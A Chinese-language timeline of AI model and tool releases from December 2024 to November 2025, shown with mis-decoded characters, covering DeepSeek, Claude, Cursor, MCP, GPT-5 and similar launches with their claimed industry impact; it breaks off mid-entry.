.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ—“ï¸ 2024å¹´ç¬¬å››å­£åº¦ï¼ˆåºç« ï¼‰</h2>
<h3 data-id="heading-1">12æœˆ26æ—¥ - DeepSeek V3 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>è®­ç»ƒæˆæœ¬ä»…550ä¸‡ç¾å…ƒ</strong>ï¼Œæ€§èƒ½ä¸GPT-4oã€Claude-3.5-Sonnetç›¸å½“</li>
<li>å®Œå…¨å¼€æº</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ ‡å¿—ç€å›½äº§å¤§æ¨¡å‹åœ¨ä»£ç ç”Ÿæˆèƒ½åŠ›ä¸Šçš„é‡å¤§çªç ´</li>
<li>æä½æˆæœ¬è¯æ˜äº†"é«˜æ€§ä»·æ¯”AI"çš„å¯èƒ½æ€§</li>
<li>å›½äº§æ¨¡å‹é¦–æ¬¡åœ¨ç®—æ³•ç±»ä»£ç åœºæ™¯æ¯”è‚©å›½é™…é¡¶å°–æ¨¡å‹</li>
<li>å¼€æºä¼˜åŠ¿ï¼Œä¸º2025å¹´çš„"DeepSeekéœ‡æ’¼"åŸ‹ä¸‹ä¼ç¬”</li>
</ul>
<hr/>
<h2 data-id="heading-2">ğŸ—“ï¸ 2025å¹´ç¬¬ä¸€å­£åº¦ï¼ˆDeepSeekéœ‡æ’¼å…¨çƒï¼‰</h2>
<h3 data-id="heading-3">1æœˆ20æ—¥ - DeepSeek R1 å‘å¸ƒï¼ˆæ”¹å˜æ¸¸æˆè§„åˆ™ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ä¸“æ³¨å¤æ‚æ¨ç†ä»»åŠ¡çš„å¤§æ¨¡å‹ï¼Œå®Œå…¨å¼€æº</li>
<li><strong>å±•ç¤ºäº†æ¨ç†æ¨¡å‹çš„çœŸæ­£å¨åŠ›ï¼šé€šè¿‡æ›´é•¿æ—¶é—´çš„æ€è€ƒæ¨ç†å–å¾—æ›´å¥½æ•ˆæœ</strong></li>
<li>æ€§èƒ½å¯¹æ ‡GPT-4oå’ŒClaude-3.5-Sonnet</li>
<li>åœ¨æ•°å­¦æ¨ç†ã€ä»£ç æ¨ç†ç­‰é¢†åŸŸè¡¨ç°ä¼˜å¼‚</li>
<li>APIå®šä»·ä»…ä¸ºOpenAI o1çš„ 2%</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>
<p><strong>åå°”è¡—éœ‡æ’¼</strong>ï¼š</p>
<ul>
<li>è‹±ä¼Ÿè¾¾å¸‚å€¼ä¸€å‘¨å†…è’¸å‘5520-5900äº¿ç¾å…ƒï¼Œè‚¡ä»·æš´è·Œ17%</li>
<li>åå°”è¡—ç§‘æŠ€è‚¡æ€»å¸‚å€¼ç¼©æ°´çº¦1ä¸‡äº¿ç¾å…ƒ</li>
<li>æ‰“ç ´äº†"é«˜ç®—åŠ›=é«˜æ€§èƒ½"çš„ä¼ ç»Ÿè®¤çŸ¥ï¼Œé‡å¡‘AIæŠ•èµ„é€»è¾‘</li>
<li>DeepSeekåº”ç”¨è¿…é€Ÿç™»é¡¶è‹¹æœä¸­ç¾åŒºåº”ç”¨å•†åº—ç¬¬ä¸€ï¼Œè¶…è¶ŠChatGPT</li>
</ul>
</li>
<li>
<p><strong>AIè¡Œä¸šæ·±è¿œå½±å“</strong>ï¼š</p>
<ul>
<li>è¯æ˜äº†ä½æˆæœ¬ä¹Ÿèƒ½å®ç°é¡¶å°–AIæ€§èƒ½ï¼Œæ‰“ç ´ç®—åŠ›å„æ–­</li>
<li>å¼€æºç­–ç•¥å¼•å‘å…¨çƒå¼€å‘è€…çƒ­æ½®</li>
<li>æ¨åŠ¨æ¨ç†æ¨¡å‹æˆä¸ºAIå‘å±•æ–°æ–¹å‘</li>
<li>ä¸­å›½AIæŠ€æœ¯å´›èµ·çš„æ ‡å¿—æ€§äº‹ä»¶</li>
<li>å¼€æºèµ‹èƒ½å›½äº§AIç”Ÿæ€ç¹è£</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">2æœˆ25æ—¥ - Claude 3.7 Sonnet å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ç¼–ç æµ‹è¯•ä¸­è¶…è¶Šo3-miniå’ŒDeepSeek R1</li>
<li>æ•°å­¦ã€ç¼–ç èƒ½åŠ›è¾ƒClaude 3.5æå‡10%+</li>
<li>åˆ·æ–°å¤šé¡¹åŸºå‡†æµ‹è¯•SOTA</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç¼–ç èƒ½åŠ›å¤§å¹…æå‡ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤æ‚ä»£ç é‡æ„åœºæ™¯</li>
<li>æˆä¸ºå½“æ—¶æœ€å¼ºçš„ç¼–ç¨‹åŠ©æ‰‹æ¨¡å‹ä¹‹ä¸€</li>
<li>åœ¨æŒ‡ä»¤æ‰§è¡Œå’Œç¼–ç¨‹ä»»åŠ¡ç†è§£ä¸Šæ›´åŠ ç²¾å‡†</li>
</ul>
<hr/>
<h3 data-id="heading-5">3æœˆ6æ—¥ - Manus å‘å¸ƒï¼ˆé€šç”¨ AI Agent æ¢ç´¢ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: è´è¶æ•ˆåº”å…¬å¸ï¼ˆButterfly Effectï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…¨çƒé¦–æ‰¹é€šç”¨AI Agent</li>
<li>èƒ½å¤Ÿç‹¬ç«‹å®ŒæˆæŠ¥å‘Šæ’°å†™ã€æ•°æ®åˆ†æã€è·¨å¹³å°æ“ä½œç­‰å¤æ‚ä»»åŠ¡</li>
<li>èƒ½å¤ŸåŠ¨æ€è§„åˆ’å’Œå†³ç­–</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ ‡å¿—ç€AIä»"å·¥å…·"å‘"æ™ºèƒ½ä½“"çš„è½¬å˜</li>
<li>å¼•å‘å…¨çƒAI Agentåˆ›ä¸šçƒ­æ½®</li>
<li>å±•ç¤ºäº†AI Agentåœ¨å®é™…åº”ç”¨ä¸­çš„å¯èƒ½æ€§</li>
<li>ä¸ºå¼€å‘è€…æä¾›äº†è‡ªä¸»æ™ºèƒ½ä½“å¼€å‘çš„æ–°æ€è·¯</li>
<li>12æœˆ30æ—¥è¢« Meta æ”¶è´­ï¼Œæ”¶è´­ä»·çº¦25äº¿ç¾å…ƒï¼Œè·ç¦»Manuså‘å¸ƒä»…9ä¸ªæœˆ</li>
</ul>
<h3 data-id="heading-6">å…¶ä»–å¹¶è´­åŠ¨æ€</h3>
<ul>
<li>å¤šå®¶AIåˆåˆ›å…¬å¸è¢«ç§‘æŠ€å·¨å¤´æ”¶è´­</li>
<li>AIåº”ç”¨é¢†åŸŸè¿›å…¥æ•´åˆæœŸ</li>
<li>ä¼ä¸šçº§AIæˆä¸ºæ”¶è´­çƒ­ç‚¹</li>
<li>æŠ€æœ¯å›¢é˜Ÿå’ŒIPæˆä¸ºæ ¸å¿ƒèµ„äº§</li>
</ul>
<hr/>
<h3 data-id="heading-7">3æœˆ24æ—¥ - DeepSeek V3-0324 ç‰ˆæœ¬æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ä»£ç å’Œæ•°å­¦æ¨ç†èƒ½åŠ›æ˜¾è‘—æå‡</li>
<li>æ¨¡å‹ç¨³å®šæ€§ä¼˜åŒ–</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ›´å¼ºçš„ä»£ç ç”Ÿæˆå’Œè°ƒè¯•èƒ½åŠ›</li>
<li>æ•°å­¦æ¨ç†èƒ½åŠ›æå‡ï¼Œé€‚åˆç§‘å­¦è®¡ç®—ç¼–ç¨‹</li>
</ul>
<hr/>
<h3 data-id="heading-8">3æœˆ25æ—¥ - Gemini 2.5 Pro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>æ”¯æŒé«˜è¾¾100ä¸‡ä¸ªtokençš„ä¸Šä¸‹æ–‡çª—å£</strong></li>
<li>åœ¨å¤šé¡¹åŸºå‡†æµ‹è¯•ä¸­è¡¨ç°å“è¶Šï¼ŒåŒ…æ‹¬æ•°å­¦ã€åˆ›æ„å†™ä½œå’Œç§‘å­¦é¢†åŸŸ</li>
<li>å…è´¹å‘æ‰€æœ‰ç”¨æˆ·å¼€æ”¾</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>å…è´¹å¼€æ”¾é™ä½äº†é«˜æ€§èƒ½AIæ¨¡å‹çš„ä½¿ç”¨é—¨æ§›</li>
</ul>
<hr/>
<h3 data-id="heading-9">3æœˆ26æ—¥ - MCP 0326 ç‰ˆå‘å¸ƒä¸æ¶æ„å‡çº§ï¼ˆç”Ÿæ€ç³»ç»Ÿç»Ÿä¸€ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>Model Context Protocolï¼ˆæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰0326 ç‰ˆå‘å¸ƒ</li>
<li>æ¶æ„å‡çº§ï¼Œæä¾›æ›´å¼ºå¤§çš„èƒ½åŠ›</li>
<li>æ ‡å‡†åŒ–AI Agentä¸å¤–éƒ¨å·¥å…·çš„é€šä¿¡æ–¹å¼</li>
<li>æä¾›ç»Ÿä¸€çš„ä¸Šä¸‹æ–‡ç®¡ç†å’Œå·¥å…·è°ƒç”¨æ¥å£</li>
<li>èµ‹èƒ½Agentè¿ˆå‘æ³›æ™ºèƒ½</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å„å¤§åº”ç”¨çº·çº·å®£å¸ƒæ”¯æŒMCP</strong></li>
<li>ç»Ÿä¸€AIå·¥å…·ä¸å¤–éƒ¨ç³»ç»Ÿçš„é›†æˆæ ‡å‡†</li>
<li>è®©AIåŠ©æ‰‹èƒ½å¤Ÿæ›´å¥½åœ°è°ƒç”¨APIã€è®¿é—®æ•°æ®åº“ã€æ“ä½œæ–‡ä»¶ç³»ç»Ÿ</li>
<li>ä¸ºæ„å»ºå¤æ‚AIå·¥ä½œæµæä¾›åŸºç¡€è®¾æ–½</li>
<li>æ”¹å˜AIåº”ç”¨å¼€å‘èŒƒå¼ï¼Œä»å•ä¸€æ¨¡å‹åˆ°å¤šå·¥å…·åä½œ</li>
<li>å¼€å‘è€…å¯ä»¥å¼€å‘MCPæœåŠ¡å™¨ï¼Œæ‰©å±•AIèƒ½åŠ›è¾¹ç•Œ</li>
</ul>
<hr/>
<h2 data-id="heading-10">ğŸ—“ï¸ 2025å¹´ç¬¬äºŒå­£åº¦ï¼ˆç”Ÿæ€å»ºè®¾ä¸æ ‡å‡†åŒ–ï¼‰</h2>
<h3 data-id="heading-11">4æœˆåˆ - Dify å®Œå–„å¼€æºç‰ˆæœ¬</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Difyå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åŸºç¡€ç‰ˆå®Œå…¨å¼€æº</strong>ï¼Œæ”¯æŒæœ¬åœ°éƒ¨ç½²</li>
<li>æä¾›ä¼ä¸šçº§AIåº”ç”¨å¼€å‘å¹³å°</li>
<li>æ”¯æŒå·¥ä½œæµç¼–æ’ã€Agentæ„å»ºã€çŸ¥è¯†åº“ç®¡ç†</li>
<li>æ”¯æŒMCPåè®®ï¼Œå¯æ¥å…¥å„ç§å·¥å…·</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æä¾›å¯è§†åŒ–å·¥ä½œæµï¼Œé™ä½AIåº”ç”¨å¼€å‘é—¨æ§›</li>
<li>æ”¯æŒMCPåè®®ï¼Œå¢å¼ºå·¥å…·é›†æˆèƒ½åŠ›</li>
<li>æœ¬åœ°éƒ¨ç½²ä¿éšœæ•°æ®å®‰å…¨</li>
<li><strong>å„å¤§ä¼ä¸šçº·çº·æœ¬åœ°éƒ¨ç½²Dify</strong></li>
</ul>
<hr/>
<h3 data-id="heading-12">5æœˆ9æ—¥ - Cursor 0.50 é‡å¤§ç‰ˆæœ¬æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…¨é¢å‡çº§Maxæ¨¡å¼</li>
<li>æ–°å¢è·¨æ–‡ä»¶ä»£ç å»ºè®®</li>
<li>åå°ä»£ç†åŠŸèƒ½</li>
<li><strong>å¯å°†æ•´ä¸ªä»£ç åº“çº³å…¥ä¸Šä¸‹æ–‡</strong></li>
</ul>
<hr/>
<h3 data-id="heading-13">5æœˆ22æ—¥ - Claude Code 1.0.0 æ­£å¼å‘å¸ƒï¼ˆæœ€å¼ºç¼–ç¨‹åŠ©æ‰‹ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ ‡å¿—ç€AIç¼–ç¨‹è¿›å…¥å·¥ä¸šçº§åº”ç”¨é˜¶æ®µ</li>
<li>ç›´æ¥åœ¨ç»ˆç«¯ä¸AIäº¤äº’</li>
<li>çµæ´»æ€§æé«˜ï¼Œå¯é›†æˆåˆ°ä»»ä½•å¼€å‘å·¥ä½œæµ</li>
<li>è„šæœ¬å‹å¥½ï¼Œå¯è‡ªåŠ¨åŒ–å„ç§å¼€å‘ä»»åŠ¡</li>
</ul>
<p><strong>å¯¹ç¨‹åºå‘˜çš„æ·±è¿œå½±å“</strong>:</p>
<ul>
<li>
<p><strong>è‡³ä»Šæœ€å¼ºç¼–ç¨‹åŠ©æ‰‹</strong>ï¼šåœ¨æ‰€æœ‰ä¸»æµç¼–ç¨‹åŸºå‡†æµ‹è¯•ä¸­æŒç»­é¢†å…ˆ</p>
</li>
<li>
<p><strong>æ”¹å˜å¼€å‘èŒƒå¼</strong>ï¼šä»"è¾…åŠ©ç¼–ç "åˆ°"AIä¸»å¯¼å¼€å‘+äººç±»å®¡æŸ¥"</p>
</li>
<li>
<p><strong>CLIæ¨¡å¼å¼•é¢†è¡Œä¸šæ½®æµ</strong>ï¼š</p>
<ul>
<li>Claude Codeçš„CLIè®¾è®¡æˆä¸ºä¸šç•Œæ ‡æ†</li>
<li>å¼€å¯äº†"AIç¼–ç¨‹åŠ©æ‰‹CLIåŒ–"çš„è¡Œä¸šè¶‹åŠ¿ï¼Œåç»­Googleæ¨å‡º<strong>Gemini CLI</strong>ï¼ŒCursoræ¨å‡º<strong>Cursor CLI</strong></li>
<li>è®©AIç¼–ç¨‹åŠ©æ‰‹å¯ä»¥æ— ç¼é›†æˆåˆ°Shellè„šæœ¬å’Œè‡ªåŠ¨åŒ–å·¥ä½œæµä¸­</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-14">5æœˆ28æ—¥ - DeepSeek R1-0528 ç‰ˆæœ¬å‡çº§</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>R1æ¨¡å‹å°ç‰ˆæœ¬å‡çº§</li>
<li>å¤æ‚æ¨ç†ä»»åŠ¡æ€§èƒ½æ˜¾è‘—æå‡</li>
</ul>
<hr/>
<h3 data-id="heading-15">6æœˆ5æ—¥ - Cursor 1.0 æ­£å¼å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>BugBotè‡ªåŠ¨ä»£ç å®¡æŸ¥</li>
<li>Memoriesè®°å¿†åŠŸèƒ½</li>
<li>Background Agentåå°ä»£ç†å…¨é¢å¼€æ”¾</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>é‡Œç¨‹ç¢‘å¼è¿›åŒ–</strong>ï¼šä»"è¾…åŠ©ç¼–ç¨‹"è¿›åŒ–åˆ°"æ™ºèƒ½ç¼–ç¨‹å¹³å°"</li>
<li>å¼•å…¥è‡ªåŠ¨ä»£ç å®¡æŸ¥ï¼ŒAIä»è¢«åŠ¨å“åº”åˆ°ä¸»åŠ¨å‘ç°é—®é¢˜</li>
<li>è®°å¿†åŠŸèƒ½è®©AIç†è§£é¡¹ç›®å†å²å’Œå¼€å‘è€…ä¹ æƒ¯ï¼Œè®°ä½ä»£ç å†³ç­–å’Œé¡¹ç›®ä¸Šä¸‹æ–‡</li>
<li>åå°ä»£ç†å®ç°çœŸæ­£çš„å¼‚æ­¥æ™ºèƒ½åä½œï¼Œæ— éœ€ç­‰å¾…ï¼ŒAIåœ¨åå°æŒç»­å·¥ä½œ</li>
</ul>
<hr/>
<h2 data-id="heading-16">ğŸ—“ï¸ 2025å¹´ç¬¬ä¸‰å­£åº¦ï¼ˆå¤šæ¨¡æ€çˆ†å‘ï¼‰</h2>
<h3 data-id="heading-17">7æœˆ4æ—¥ - Cursor 1.2 ç‰ˆæœ¬å‘å¸ƒï¼ˆå¼•å…¥Planæ¨¡å¼ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>
<p><strong>Planæ¨¡å¼ï¼ˆä»»åŠ¡è§„åˆ’æ¨¡å¼ï¼‰é¦–æ¬¡å‘å¸ƒ</strong>ï¼š</p>
<ul>
<li><strong>ç»“æ„åŒ–å¾…åŠåˆ—è¡¨ï¼ˆTo-do listsï¼‰</strong> ï¼šå°†é•¿ä»»åŠ¡æ‹†åˆ†æˆå¸¦ä¾èµ–å…³ç³»çš„æ­¥éª¤</li>
<li><strong>æ¶ˆæ¯é˜Ÿåˆ—ç®¡ç†</strong>ï¼šæœ‰åºå¤„ç†å¤æ‚ä»»åŠ¡</li>
<li><strong>ä¾èµ–å…³ç³»å¯è§†åŒ–</strong>ï¼šæ¸…æ™°å±•ç¤ºä»»åŠ¡é—´çš„å…³è”</li>
<li><strong>é•¿å‘¨æœŸä»»åŠ¡å‹å¥½</strong>ï¼šæ›´å®¹æ˜“ç†è§£ä¸è·Ÿè¸ªå¤§å‹é‡æ„é¡¹ç›®</li>
<li><strong>ä¸Agentæ¨¡å¼æ·±åº¦æ•´åˆ</strong>ï¼šAgentè‡ªåŠ¨åˆ›å»ºå’Œç»´æŠ¤è®¡åˆ’</li>
</ul>
</li>
<li>
<p><strong>Agentä»»åŠ¡è§„åˆ’å¢å¼º</strong>ï¼šAgentèƒ½å¤Ÿæ›´å¥½åœ°è§„åˆ’å’Œæ‰§è¡Œé•¿æ—¶ç¨‹ä»»åŠ¡</p>
</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Planæ¨¡å¼æä¾›ç»“æ„åŒ–çš„ä»»åŠ¡ç®¡ç†ï¼Œé€‚åˆå¤§å‹é¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-18">8æœˆ7æ—¥ - GPT-5 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>ç»“åˆæ¨ç†èƒ½åŠ›å’Œéæ¨ç†åŠŸèƒ½</li>
<li>å¤šæ¨¡æ€å¤„ç†èƒ½åŠ›æ˜¾è‘—æå‡</li>
<li>é•¿æ–‡æœ¬ç†è§£èƒ½åŠ›å¢å¼º</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç»Ÿä¸€æ¨ç†å’Œç”Ÿæˆèƒ½åŠ›ï¼Œä¸€ä¸ªæ¨¡å‹æå®šå¤šç§ä»»åŠ¡</li>
<li>å¤šæ¨¡æ€èƒ½åŠ›è®©ä»£ç +å›¾è¡¨+UIåŒæ—¶å¤„ç†æˆä¸ºå¯èƒ½</li>
<li>æ›´é•¿çš„ä¸Šä¸‹æ–‡çª—å£ï¼Œé€‚åˆåˆ†æå¤§å‹é¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-19">8æœˆä¸­æ—¬ - Suno v4 éŸ³ä¹ç”Ÿæˆæ¨¡å‹å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Suno</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ–‡æœ¬åˆ°éŸ³ä¹ç”Ÿæˆ</li>
<li>æ”¯æŒå¤šç§éŸ³ä¹é£æ ¼</li>
<li>å¯ç”Ÿæˆå¸¦æ­Œè¯çš„å®Œæ•´æ­Œæ›²</li>
<li>éŸ³è´¨å’Œè‡ªç„¶åº¦æ˜¾è‘—æå‡</li>
</ul>
<hr/>
<h3 data-id="heading-20">8æœˆ30æ—¥ - Nano Banana å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å›¾åƒç”Ÿæˆæ¨¡å‹</li>
<li>å½“æ—¶çš„æœ€å¼ºå›¾ç‰‡ç”Ÿæˆæ¨¡å‹</li>
<li>é›†æˆGeminièƒ½åŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-21">9æœˆ30æ—¥ - Claude 4.5 Sonnet å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>è¢«èª‰ä¸º"ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç æ¨¡å‹"</strong></li>
<li><strong>èƒ½å¤Ÿè‡ªä¸»è¿è¡Œé•¿è¾¾30å°æ—¶</strong>ï¼šæ”¯æŒå¤§å‹é¡¹ç›®çš„æŒç»­å¼€å‘</li>
<li><strong>æ¨ç†å’Œæ•°å­¦èƒ½åŠ›æ˜¾è‘—æå‡</strong>ï¼šå¤æ‚é€»è¾‘å¤„ç†èƒ½åŠ›è¾¾åˆ°æ–°é«˜åº¦</li>
<li><strong>é€‚åˆæ„å»ºå¤æ‚ä»£ç†</strong>ï¼šå¤šæ­¥éª¤ä»»åŠ¡è§„åˆ’å’Œæ‰§è¡Œèƒ½åŠ›è¡Œä¸šé¢†å…ˆ</li>
<li><strong>Claude CodeåŸºäºæ­¤ç‰ˆæœ¬è¾¾åˆ°å·…å³°æ€§èƒ½</strong></li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>ç¼–ç¨‹æ€§èƒ½é‡Œç¨‹ç¢‘</strong>ï¼Œå„é¡¹ç¼–ç¨‹æ’åç¬¬ä¸€</li>
<li><strong>å¼€å‘è€…é¦–é€‰</strong>ï¼šä¸“ä¸šç¨‹åºå‘˜æœ€ä¿¡èµ–çš„AIç¼–ç¨‹ä¼™ä¼´</li>
</ul>
<hr/>
<h2 data-id="heading-22">ğŸ—“ï¸ 2025å¹´ç¬¬å››å­£åº¦ï¼ˆAIå†›å¤‡ç«èµ›ç™½çƒ­åŒ–ï¼‰</h2>
<h3 data-id="heading-23">10æœˆ16æ—¥ - Claude Agent Skills æ­£å¼å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å…è®¸å°†ä¸“ä¸šçŸ¥è¯†ã€è„šæœ¬å’Œèµ„æºæ‰“åŒ…æˆæ¨¡å—åŒ–çš„"æŠ€èƒ½æ–‡ä»¶å¤¹"</li>
<li>ä½¿AIåœ¨ç‰¹å®šå·¥ä½œåœºæ™¯ä¸­æ›´ä¸“ä¸šåœ°æ‰§è¡Œä»»åŠ¡</li>
<li>æ”¯æŒä¼ä¸šå®šåˆ¶ä¸“å±æŠ€èƒ½åº“</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ›´æ–¹ä¾¿åœ°æ‰©å±•Claudeçš„åŠŸèƒ½</li>
<li>å¯åˆ›å»ºé’ˆå¯¹ç‰¹å®šç¼–ç¨‹è¯­è¨€ã€æ¡†æ¶çš„ä¸“ä¸šæŠ€èƒ½</li>
<li>ä¼ä¸šå¯æ‰“é€ ç¬¦åˆå†…éƒ¨è§„èŒƒçš„ç¼–ç æŠ€èƒ½</li>
<li>æå‡AIåœ¨ä¸“ä¸šé¢†åŸŸçš„å‡†ç¡®æ€§å’Œå¯é æ€§</li>
<li>å¼€å‘è€…ç¤¾åŒºæ¶Œç°å¤§é‡å¼€æºæŠ€èƒ½</li>
</ul>
<hr/>
<h3 data-id="heading-24">10æœˆ16æ—¥ - Google Veo 3.1 å‘å¸ƒï¼ˆAIè§†é¢‘ç”Ÿæˆæ–°é‡Œç¨‹ç¢‘ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google DeepMind</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åŸç”ŸéŸ³é¢‘é›†æˆ</strong>ï¼šé¦–æ¬¡å®ç°ç¯å¢ƒéŸ³ã€å¯¹è¯ã€éŸ³æ•ˆä¸ç”»é¢åŒæ­¥ç”Ÿæˆ</li>
<li><strong>1080pé«˜æ¸…è§†é¢‘</strong>ï¼šæ”¯æŒç”Ÿæˆæœ€é•¿60ç§’çš„é«˜æ¸…è§†é¢‘</li>
<li><strong>ç”Ÿæˆé€Ÿåº¦æå‡</strong>ï¼š1-4åˆ†é’Ÿå³å¯å®Œæˆï¼Œå¿«äºå‰ä»£ç‰ˆæœ¬</li>
<li><strong>å™äº‹æ§åˆ¶å¢å¼º</strong>ï¼šæ›´å¥½çš„åœºæ™¯è¿è´¯æ€§å’Œæ•…äº‹è®²è¿°èƒ½åŠ›</li>
<li><strong>çœŸå®æ„Ÿæå‡</strong>ï¼šç”»é¢è´¨é‡å’Œç»†èŠ‚å¤„ç†è¾¾åˆ°æ–°é«˜åº¦</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>è§†é¢‘ç”ŸæˆæŠ€æœ¯çªç ´</strong>ï¼šéŸ³è§†é¢‘åŒæ­¥ç”Ÿæˆå‡å°‘åæœŸåˆ¶ä½œå·¥ä½œé‡</li>
<li><strong>å†…å®¹åˆ›ä½œæ°‘ä¸»åŒ–</strong>ï¼šè‡ª5æœˆFlowå¹³å°ä¸Šçº¿ï¼Œç”¨æˆ·å·²åˆ›ä½œè¶…2.75äº¿ä¸ªè§†é¢‘</li>
<li><strong>åŠ å‰§AIè§†é¢‘ç«äº‰</strong>ï¼šä¸Soraã€Runwayç­‰å½¢æˆæ¿€çƒˆç«äº‰ï¼Œæ¨åŠ¨è¡Œä¸šå¿«é€Ÿåˆ›æ–°</li>
<li><strong>å½±è§†åˆ¶ä½œå˜é©</strong>ï¼šä¸ºä¸“ä¸šå½±è§†åˆ¶ä½œæä¾›é«˜æ•ˆçš„AIè¾…åŠ©å·¥å…·</li>
</ul>
<hr/>
<h3 data-id="heading-25">10æœˆ29æ—¥ - Cursor 2.0 ç‰ˆæœ¬å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>è‡ªç ”ç¼–ç¨‹æ¨¡å‹ Composer</li>
<li>æµè§ˆå™¨é›†æˆåŠŸèƒ½</li>
<li>æ”¯æŒå¤šæ¨¡å‹å¹¶è¡Œå¤„ç†ï¼Œé€‰å–æœ€ä½³æ•ˆæœ</li>
</ul>
<hr/>
<h3 data-id="heading-26">11æœˆ12æ—¥ - GPT-5.1 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ‰©å±•å¤šæ¨¡æ€åŠŸèƒ½</li>
